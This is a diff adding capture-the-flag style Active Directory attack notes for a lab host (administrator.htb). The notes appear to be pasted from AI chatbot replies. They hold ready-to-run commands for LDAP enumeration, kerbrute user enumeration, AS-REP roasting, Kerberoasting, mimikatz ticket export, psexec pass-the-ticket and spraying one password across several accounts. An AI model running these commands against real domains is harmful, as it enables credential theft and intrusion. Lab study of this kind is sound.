@@ -236,3 +236,144 @@ Pbis allow you to get basic information easily:
         ./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
         echo "======================"
     done
+
+
+
+
+LDAP Enumeration and Attacks
+LDAP is used to query and manage AD objects like users, groups, and permissions. Here are some enumeration techniques and possible attacks:
+
+Basic LDAP Enumeration
+You can query LDAP to obtain information about users, groups, computers, and more. Tools like ldapsearch, nmap, or ldapdomaindump are useful here.
+
+Using ldapsearch:
+
+    ldapsearch -x -h 10.10.11.42 -D "CN=Olivia,CN=Users,DC=administrator,DC=htb" -w 'ichliebedich' -b "DC=administrator,DC=htb"
+Replace "CN=Olivia,CN=Users,DC=administrator,DC=htb" with your distinguished name (DN) and -b with the base DN of the domain. This command queries all objects under the specified base.
+
+Extract Sensitive Information with ldapdomaindump:
+
+    ldapdomaindump -u "administrator.htb\Olivia" -p 'ichliebedich' -d 10.10.11.42
+This tool generates HTML and JSON reports, detailing user accounts, groups, and more.
+
+Attacking LDAP with Null Binds
+If anonymous access is allowed, try accessing LDAP with no credentials:
+
+    ldapsearch -x -h 10.10.11.42 -b "DC=administrator,DC=htb"
+This may reveal valuable information like usernames, group memberships, and policies without authentication.
+
+2. Kerberos Attacks
+Kerberos is a network authentication protocol that uses ticketing. Attacks often target weak encryption methods or improperly managed accounts.
+
+Kerberos Pre-Authentication Enumeration
+If you know valid usernames in the domain, you can attempt Kerberos authentication with them to confirm which ones are active without needing passwords.
+
+User Enumeration with kerbrute:
+    
+    kerbrute userenum -d administrator.htb --dc 10.10.11.42 username_list.txt
+kerbrute will indicate which usernames are valid by sending login requests and checking responses.
+AS-REP Roasting
+This attack targets accounts with Kerberos pre-authentication disabled. When pre-auth is disabled, attackers can request encrypted Ticket Granting Tickets (TGTs) without knowing the password and then try to crack them offline.
+
+Using Impacket’s GetNPUsers.py:
+    
+    GetNPUsers.py administrator.htb/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.42
+If successful, this will output hashes of accounts that can be cracked offline with tools like hashcat.
+Kerberoasting
+Kerberoasting targets service accounts, which often have weaker passwords. Attackers request a service ticket (TGS) and attempt to crack it offline.
+
+Enumerate Service Principal Names (SPNs):
+
+    ldapsearch -x -h 10.10.11.42 -D "CN=Olivia,CN=Users,DC=administrator,DC=htb" -w 'ichliebedich' -b "DC=administrator,DC=htb" "(servicePrincipalName=*)"
+Requesting and Cracking Service Tickets with Impacket’s GetUserSPNs.py:
+
+    GetUserSPNs.py administrator.htb/Olivia:ichliebedich -dc-ip 10.10.11.42 -request
+The output is a service ticket hash, which can be cracked offline.
+
+Pass-the-Ticket (PtT) Attack
+If you manage to capture a Ticket Granting Ticket (TGT) or a Ticket Granting Service (TGS), you can impersonate the user and access services.
+
+Using mimikatz:
+Export the ticket from klist:
+    
+    klist -e
+Pass the ticket with mimikatz:
+    
+    sekurlsa::tickets /export
+Use the ticket with psexec.py from Impacket:
+    
+    psexec.py -k -no-pass administrator.htb/Olivia@10.10.11.42
+Tools for LDAP and Kerberos Attacks
+LDAP Enumeration: ldapsearch, ldapdomaindump, nmap (for LDAP-specific NSE scripts).
+Kerberos Enumeration and Attacks: kerbrute, Impacket suite (GetNPUsers.py, GetUserSPNs.py), hashcat, mimikatz.
+Each of these attacks requires the right permissions and contexts, so be sure to respect authorization limits and ethical guidelines. Let me know if you need specific command usage or more on configuring these tools!
+
+
+
+
+
+
+
+
+
+
+
+
+
+Try Using the Full UPN (User Principal Name)
+Instead of using CN=Olivia, you could try using the full UPN format (which is similar to an email address) as the username:
+
+Olivia@administrator.htb
+If Olivia is a user in the administrator.htb domain, this format might work.
+
+Updated Command Example:
+ldapsearch -x -H ldap://10.10.11.42 -D "Olivia@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
+3. Check for Typo in the Password
+Ensure that there are no typographical errors in the password (ichliebedich). It might also help to ensure that the password does not have any extra spaces, especially at the end.
+
+4. Check the Account Lock or Permissions
+It's possible that the Olivia account may be locked out or disabled in Active Directory. If you have the necessary permissions, check the status of the account and reset the password if needed.
+
+5. Use -D with an Admin Account
+If Olivia is not a privileged user or does not have access to query the directory, you can try binding with an admin account (such as Administrator) to see if you get any different results:
+
+ldapsearch -x -H ldap://10.10.11.42 -D "Administrator@administrator.htb" -w "password" -b "dc=administrator,dc=htb" "(objectClass=user)"
+Make sure to replace "password" with the actual password of the Administrator account.
+
+6. Debugging with -LLL
+You can also use the -LLL flag to simplify the output and help you debug the LDAP query more effectively:
+
+ldapsearch -LLL -x -H ldap://10.10.11.42 -D "Olivia@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
+This will show a more concise output and help you focus on the results rather than LDAP-specific metadata.
+
+
+
+
+
+
+
+
+
+
+
+
+To perform the LDAP query for the usernames that are identified as valid (i.e., michael, emily, benjamin, olivia, ethan), you can run individual LDAP queries for each of them, replacing the username and password accordingly.
+
+Here's how you can format the LDAP search for each of these usernames:
+
+1. For michael@administrator.htb
+ldapsearch -x -H ldap://10.10.11.42 -D "michael@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
+2. For emily@administrator.htb
+ldapsearch -x -H ldap://10.10.11.42 -D "emily@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
+3. For benjamin@administrator.htb
+ldapsearch -x -H ldap://10.10.11.42 -D "benjamin@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
+4. For olivia@administrator.htb
+ldapsearch -x -H ldap://10.10.11.42 -D "olivia@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
+5. For ethan@administrator.htb
+ldapsearch -x -H ldap://10.10.11.42 -D "ethan@administrator.htb" -w "ichliebedich" -b "dc=administrator,dc=htb" "(objectClass=user)"
+Explanation:
+-D "username@administrator.htb": Specifies the user you want to bind with (e.g., michael@administrator.htb).
+-w "ichliebedich": The password for each user.
+-b "dc=administrator,dc=htb": The base DN for the LDAP search, which seems to be the root domain for administrator.htb.
+(objectClass=user): Filters the search to only return user objects.
+You should run each of these commands one by one. If the credentials and the DN are correct, it will return user information for each account. If you encounter errors, make sure the credentials and domain are accurate, and the account you are binding with has the necessary permissions.
